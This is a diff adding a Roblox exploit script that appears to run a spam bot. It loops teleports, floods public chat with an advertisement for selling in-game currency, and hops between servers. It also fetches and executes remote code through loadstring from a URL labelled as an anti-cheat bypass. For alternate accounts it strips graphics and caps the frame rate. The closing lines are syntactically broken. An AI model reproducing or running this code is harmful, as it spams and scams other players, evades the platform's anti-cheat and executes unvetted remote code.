@@ -1,0 +1,134 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+local teleportCoords = Vector3.new(-412, 22, -286)
+local teleportInterval = 5
+local message = "seip_dsk on distord SELL DHC"
+local messageInterval = 20
+local serverHopInterval = 180
+local previousServers = {}
+local gameId = 2788229376
+
+local function teleport()
+    if game.Players.LocalPlayer and game.Players.LocalPlayer.Character then
+        game.Players.LocalPlayer.Character:MoveTo(teleportCoords)
+    end
+end
+
+local function sendMessage()
+    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
+end
+
+local function serverHop()
+    local servers = {}
+    local req = http_request({
+        Url = "https://games.roblox.com/v1/games/" .. gameId .. "/servers/Public?sortOrder=Asc&limit=100"
+    })
+    local body = game:GetService("HttpService"):JSONDecode(req.Body)
+    if body and body.data then
+        for _, v in ipairs(body.data) do
+            if v.playing < v.maxPlayers and not table.find(previousServers, v.id) then
+                table.insert(servers, v.id)
+            end
+        end
+    end
+    
+    if #servers > 0 then
+        local serverId = servers[math.random(1, #servers)]
+        table.insert(previousServers, serverId)
+        if #previousServers > 100 then
+            table.remove(previousServers, 1)
+        end
+        game:GetService("TeleportService"):TeleportToPlaceInstance(gameId, serverId, game.Players.LocalPlayer)
+    else
+        warn("No suitable servers found.")
+    end
+end
+
+spawn(function()
+    while true do
+        teleport()
+        wait(teleportInterval)
+    end
+end)
+
+spawn(function()
+    while true do
+        sendMessage()
+        wait(messageInterval)
+    end
+end)
+
+spawn(function()
+    while true do
+        wait(serverHopInterval)
+        serverHop()
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
+
+-- GUI Code
+local player = game:service"Players".LocalPlayer
+local ws = workspace
+
+local ishost = player.UserId == Settings['host']
+if not ishost then
+    settings().Physics.PhysicsEnvironmentalThrottle = 1
+    settings().Rendering.QualityLevel = 'Level01'
+    UserSettings():GetService("UserGameSettings").MasterVolume = 0
+    for i, v in pairs(game:GetDescendants()) do
+        if v:IsA("Part") then
+            v.Material = Enum.Material.Pavement
+            v.Transparency = 1
+        elseif v:IsA("Decal") then
+            v:Destroy()
+        elseif v:IsA("Texture") then
+            v:Destroy()
+        elseif v:IsA("MeshPart") then
+            v.TextureID = 0
+            v.Transparency = 1
+        elseif v.Name == "Terrian" then
+            v.WaterReflectace = 1
+            v.WaterTransparency = 1
+        elseif v:IsA("SpotLight") then
+            v.Range = 0
+            v.Enabled = false
+        elseif v:IsA("WedgePart") then
+            v.Transparency = 1
+        elseif v:IsA("UnionOperation") then
+            v.Transparency = 1
+        end
+    end
+    local ScreenGui = Instance.new("ScreenGui")
+    local Frame = Instance.new("Frame")
+    local TextLabel = Instance.new("TextLabel")
+    
+    ScreenGui.Parent = game:service"CoreGui"
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Name = "UltraHider10000000"
+    
+    Frame.Parent = ScreenGui
+    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+    Frame.BackgroundColor3 = Color3.fromRGB(11, 11, 11)
+    Frame.BackgroundTransparency = 0.75  -- 25% more transparent
+    Frame.BorderColor3 = Color3.fromRGB(11, 11, 11)
+    Frame.BorderSizePixel = 100
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.Size = UDim2.new(0.6, 0, 0.4, 0)  -- Increased size of the frame
+    
+    TextLabel.Parent = Frame
+    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.BackgroundTransparency = 1.000
+    TextLabel.Position = UDim2.new(0.1, 0, 0.3, 0)  -- Adjusted position of the text label
+    TextLabel.Size = UDim2.new(0.8, 0, 0.4, 0)  -- Increased size of the text label
+    TextLabel.Font = Enum.Font.SourceSansBold
+    TextLabel.Text = game:service"Players".LocalPlayer.Name .. "\scripted by debrainers\nhave fun getting customers"
+    TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TextLabel.TextSize = 40.000  -- Increased text size
+    TextLabel.TextYAlignment = Enum.TextYAlignment.Top  -- Align text to the top
+    TextLabel.TextWrapped = true  -- Allow text to wrap to new lines
+    
+    pcall(function() setfpscap(10)
+end
